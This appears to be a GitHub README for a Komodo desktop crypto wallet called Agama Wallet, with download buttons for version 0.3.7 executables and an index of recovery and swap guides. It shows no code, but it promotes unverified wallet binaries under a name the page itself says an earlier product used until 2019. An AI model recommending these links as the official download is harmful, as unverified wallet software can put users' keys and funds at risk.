[![Agama Wallet](assets/banner-hub.png)](https://github.com/agama-wallet/agama-desktop-wallet)

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7"><img src="https://img.shields.io/badge/RELEASE-v0.3.7-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="Agama Wallet v0.3.7"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/blob/main/LICENSE"><img src="https://img.shields.io/badge/LICENSE-MIT-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="MIT licence"></a>

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Download for Windows"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>

All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page.

---


## Agama Wallet guides

Agama Wallet is a self-custody desktop wallet for the Komodo ecosystem with atomic swaps built in, on Windows, macOS and Linux. This repository is its GitHub page and guide index: install and verify 0.3.7, recover your keys, and read the history people still ask about.

Four questions bring most readers here. Can I check the file first - yes, the release prints a SHA-256 beside every asset. Why does a restored wallet show nothing - usually the wrong product, an unscanned derivation range, or a node not yet caught up. Was this discontinued - two products shared the name; one stopped in 2019. Which am I holding - a version number and an install path answer that fastest.

Every guide stands alone, and claims that rest on the project rather than on something observable say so. Two habits run through the set: verify the download against the published hash, and treat the recovery phrase as the wallet - nobody needs it to help you, anyone who asks is taking it.

Swap mechanics and the ledger model live in their own repositories, linked below. Start with the download guide, then the restore guide before you need it.

---


## Start here


<div align="center">

| Guide | What it covers |
|---|---|
| [What Is a UTXO?](https://github.com/agama-wallet/utxo/blob/main/unspent-transaction-outputs-explained.md) | coins as outputs, spent whole and returned as change |
| [HTLC Explained: Hash Time-Locked Contracts](https://github.com/agama-wallet/atomic-swaps/blob/main/hash-time-locked-contracts.md) | the secret and the timer that make a trustless trade possible |
| [No-KYC Crypto Swaps: What "No KYC" Actually Means](https://github.com/agama-wallet/atomic-swaps/blob/main/what-no-kyc-means.md) | no account and no identity check, and what the chain still shows |
| [KMD Coin: What Komodo's Native Asset Does](https://github.com/agama-wallet/agama-wallet/blob/main/what-kmd-does.md) | what the native asset pays for, and what its supply does |
| [Agama Wallet Download: Version 0.3.7 and How to Get It](https://github.com/agama-wallet/agama-wallet/blob/main/download-and-install.md) | where the files are, which version is current, and how to check one |

</div>

## Install and verify

<div align="center">

| Guide | What it covers |
|---|---|
| [Agama Wallet Download: Version 0.3.7 and How to Get It](https://github.com/agama-wallet/agama-wallet/blob/main/download-and-install.md) | where the files are, which version is current, and how to check one |
| [Agama Wallet: What It Is, and Which Agama You Are Looking At](https://github.com/agama-wallet/agama-wallet/blob/main/which-version-you-have.md) | the two products behind one name, and how to tell which you installed |
| [Is Agama Wallet Safe? What Can and Cannot Be Verified](https://github.com/agama-wallet/agama-wallet/blob/main/is-it-safe-to-use.md) | what the licence, the source and the release values can and cannot prove |
| [Which Assets Agama Wallet Supports](https://github.com/agama-wallet/agama-wallet/blob/main/supported-coins.md) | the assets the wallet lists, and the token that depends on another chain |

</div>

## Recovery and answers

<div align="center">

| Guide | What it covers |
|---|---|
| [Restoring an Agama Wallet: Seed, Passphrase and Wallet File](https://github.com/agama-wallet/agama-wallet/blob/main/restore-from-seed-phrase.md) | the restore flow, and why a phrase is the only route back |
| [Why a Seed Phrase Fails to Restore a Wallet](https://github.com/agama-wallet/agama-wallet/blob/main/why-a-seed-phrase-fails.md) | word order, derivation rules and scan ranges, in that order |
| [Agama Wallet Shows Zero Balance: Causes and Checks](https://github.com/agama-wallet/agama-wallet/blob/main/zero-balance-after-restore.md) | four causes in the order worth checking, cheapest first |
| [Agama Wallet Backup: What wallet.dat Covers](https://github.com/agama-wallet/agama-wallet/blob/main/backup-what-dat-covers.md) | what the wallet file holds, and what it misses |

</div>

## More guides

All 24 guides in this repository on one page: [full guide index](https://github.com/agama-wallet/agama-wallet/blob/main/index.md).

The swap mechanics and the ledger model have repositories of their own:

- [Atomic swap guides](https://github.com/agama-wallet/atomic-swaps) - how a trade works, what it costs, and where it fails
- [UTXO guides](https://github.com/agama-wallet/utxo) - outputs, coin control and why a balance is a sum


## About

Published alongside Agama Wallet, a self-custody multi-asset wallet for the Komodo ecosystem with built-in atomic swaps. Download links point at the tagged GitHub release and nowhere else.

## License

MIT
